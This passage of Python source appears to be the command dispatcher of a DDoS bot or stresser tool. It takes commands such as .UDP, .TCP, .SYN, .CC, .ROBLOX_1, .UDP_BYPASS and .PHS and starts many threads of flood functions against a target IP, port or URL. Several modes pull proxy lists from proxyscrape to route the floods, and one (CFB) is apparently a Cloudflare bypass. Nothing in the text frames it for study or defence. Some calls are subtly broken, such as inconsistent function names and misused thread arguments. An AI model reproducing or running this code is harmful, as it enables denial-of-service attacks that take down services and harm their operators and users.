                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "22" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                elif "23" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                elif "24" in mode:
                    number_timeout = int(random.randint(50,10000))
                    for _ in range(threads):
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                elif "25" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","TH","US","HK","EN","RU","PK","SY","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                elif "26" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "27" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "28" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "29" in mode:
                    number_timeout = int(random.randint(50,10000))
                    country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                    link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                    req = requests.get(link_get+country+'')
                    array = req.text.split()
                    for _ in range(threads):
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=flooding_hell, args=(url, secs), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                elif "30" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=flooding_hell, args=(url, secs))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "31" in mode:
                    for _ in range(threads):
                        t1 = threading.Thread(target=flooding_hell, args=(url, secs))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "32" in mode:
                    for _ in range(threads):
                        t1 = threading.Thread(target=flooding_hell, args=(url, secs))
                        t1.start()
                elif "33" in mode:
                    for _ in range(threads):
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "34" in mode:
                    for _ in range(threads):
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                elif "35" in mode:
                    for _ in range(threads):
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "36" in mode:
                    for _ in range(threads):
                        th1 = threading.Thread(target=REQ_ATTACK2, args=(url,method))
                        th1.start()
                elif "37" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","HK","CY","SE","CH","TH","PK","US","SY","EN","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        threading.Thread(target=check_prox, args=(array,secs, url,method), daemon=True).start()
                        threading.Thread(target=REQ_attack, args=(ip,method, secs), daemon=True).start()
                        threading.Thread(target=CFB, args=(ip,method, secs), daemon=True).start()
                        th1 = threading.Thread(target=REQ_ATTACK2, args=(url,method))
                        th1.start()
                elif "38" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "39" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=REQ_ATTACK2, args=(ip,method))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "40" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=REQ_ATTACK2, args=(ip,method))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "41" in mode:
                    for _ in range(threads):
                        th1 = threading.Thread(target=REQ_ATTACK2, args=(url,method))
                        th1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "42" in mode:
                    for _ in range(threads):
                        th1 = threading.Thread(target=REQ_ATTACK2, args=(url,method))
                        th1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "43" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack2, args=(ip,method))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
                elif "44" in mode:
                    for _ in range(threads):
                        number_timeout = int(random.randint(50,10000))
                        country = str(random.choice(("LA","JP","CZ","CY","SE","CH","HK","TH","US","PK","EN","SY","RU","CU","AL","JO","CA","PA","GE","ME","ES","BA","GR","DE","VE","IT","IR","BO","BR","NO","FR","SI","SA","IN","DO","NI","all")))
                        link_get = str(random.choice(("https://api.proxyscrape.com/?request=displayproxies&timeout="+number_timeout+"&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/?request=displayproxies&timeout=10000&country=all&ssl=all&anonymity=","https://api.proxyscrape.com/v2/?request=displayproxies&country=")))
                        req = requests.get(link_get+country+'')
                        array = req.text.split()
                        t1 = threading.Thread(target=check_prox, args=(array,secs,url,method))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack, args=(ip,method, secs))
                        t1.start()
                        t1 = threading.Thread(target=REQ_attack2, args=(ip,method))
                        t1.start()
                        t1 = threading.Thread(target=CFB, args=(ip,method, secs))
                        t1.start()
            elif command == '.UDP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TCP':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TCPSYN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
            elif command == '.ROBLOX_1':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
            elif command == ".MULTIDT": # MULTIPLY DATA TCP
                ip = args[1]
                port = int(args[2])
                data_num = int(args[3])
                data_num2 = int(args[4])
                data_multi = int(args[5])
                data_multi2 = int(args[6])
                secs = time.time() + int(args[7])
                mode = args[8]
                threads = int(args[9])
                while time.time() < secs:
                    if mode in "1":
                        threading.Thread(target=attack_multiply_data_tcp,args=(ip,port,data_num,data_num2,data_multi,data_multi2)).start()
                    elif mode in "2":
                        threading.Thread(target=attack_multiply_data_tcp,args=(ip,port,data_num,data_num2,data_multi,data_multi2),daemon=True).start()
                    elif mode in "3":
                        th1 = threading.Thread(target=attack_multiply_data_tcp,args=(ip,port,data_num,data_num2,data_multi,data_multi2))
                        th1.start()
            elif command == '.ROBLOX_2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_roblox2, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.ROBLOX_ALL':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_roblox2, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.UDP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TCP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_BYPASS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_NEW':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_NEW2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.TUP_NEW3':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                size = int(args[4])
                threads = int(args[5])

                for _ in range(threads):
                    threading.Thread(target=attack_tcp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_tcp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_roblox2, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_udp_bypass, args=(ip, port, secs, size), daemon=True).start()
                    threading.Thread(target=attack_roblox, args=(ip, port, secs, size), daemon=True).start()
            elif command == '.NULCEAR_ATTACKS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                while time.time() < secs:
                    threading.Thread(target=attack_nulcear, args=(ip, port, secs), daemon=True).start()
                    threading.Thread(target=attack_nulcear2, args=(ip, port, secs), daemon=True).start()
            elif command == ".CUSTOM_PACKET":
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                thread_time = int(args[4])
                payload = str(args[5])
                mode = str(args[6])
                threads = int(args[7])
                th1 = ""

                while time.time() < secs:
                    if mode in 'DAEMON1':
                        threading.Thread(custom_packet, args=(ip,port,thread_time,payload), daemon=True).start()
                    elif mode in 'THREAD1':
                        threading.Thread(custom_packet, args=(ip,port,thread_time,payload)).start()
                    elif mode in 'REQUESTS1':
                        t1 = threading.Thread(target=custom_packet, args=(ip,port,thread_time,payload))
                        t1.start()
                    elif mode in 'THREAD2':
                        threading.Thread(custom_packet2, args=(ip,port,thread_time,payload), daemon=True).start()
                    elif mode in 'REQUESTS2':
                        t1 = threading.Thread(target=custom_packet2, args=(ip,port,thread_time,payload), daemon=True)
                        t1.start()

            elif command == '.CC':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_cc, args=(ip, port, secs), daemon=True).start()
            elif command == '.CC2':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                
                while time.time() < secs:
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
            elif command == '.CC3':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_cc3, args=(ip, port, secs), daemon=True).start()
            elif command == '.CC4':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                
                while time.time() < secs:
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
            elif command == '.CC5':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])
                
                while time.time() < secs:
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc2,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
                    threading.Thread(target=attack_cc4,args=(ip, port)).start()
            elif command == '.NDS':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                while time.time() < secs:
                    threading.Thread(target=no_data_send, args=(ip, port), daemon=True).start()
            elif command == '.SYN':
                 
                ip = args[1]
                port = int(args[2])
                secs = time.time() + int(args[3])
                threads = int(args[4])

                for _ in range(threads):
                    threading.Thread(target=attack_syn, args=(ip, port, secs), daemon=True).start()
            elif command == '.PHS':
                ip = ""
                host = ""
                url = args[1]
                port = int(args[2])
                type_header = str(args[3])
                secs = time.time() + int(args[4])
                threads = int(args[5])

                try:
                     host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                     ip = socket.gethostbyname(host)
                except socket.gaierror:
                    print("CAN'T GET IP . . .")

                while time.time() < secs:
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    t1 = threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port))
                    t1.start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
                    threading.Thread(target=pyflooder_hell_request,args=(type_header,host,ip,port)).start()
